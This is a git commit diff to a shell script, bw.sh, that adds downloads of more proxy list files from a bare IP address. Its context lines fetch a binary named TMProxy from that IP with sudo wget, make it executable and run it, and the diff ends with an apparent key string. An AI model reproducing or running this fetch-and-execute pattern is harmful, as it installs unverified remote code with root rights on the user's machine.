27baaaf183fdab8a1357f7fc362b5508032cc109
ngadt95 <99725055+ngadt95@users.noreply.github.com>
2022-07-16 17:58:04 +0700

    Update bw.sh

--- bw.sh
+++ bw.sh
@@ -5,6 +5,13 @@ sudo wget http://135.148.165.162/TMProxy
 sudo wget http://135.148.165.162/proxy1.txt
 sudo wget http://135.148.165.162/proxy2.txt
 sudo wget http://135.148.165.162/proxy3.txt
+sudo wget http://135.148.165.162/proxy4.txt
+sudo wget http://135.148.165.162/proxy5.txt
+sudo wget http://135.148.165.162/proxy6.txt
+sudo wget http://135.148.165.162/proxy7.txt
+sudo wget http://135.148.165.162/proxy8.txt
+sudo wget http://135.148.165.162/proxy9.txt
+sudo wget http://135.148.165.162/proxy10.txt
 chmod u+x TMProxy 
 ./TMProxy
 6EtGBRe4JSf4bdHPnCU6ABg1k2Tv7IvWxUivIKPecdU=
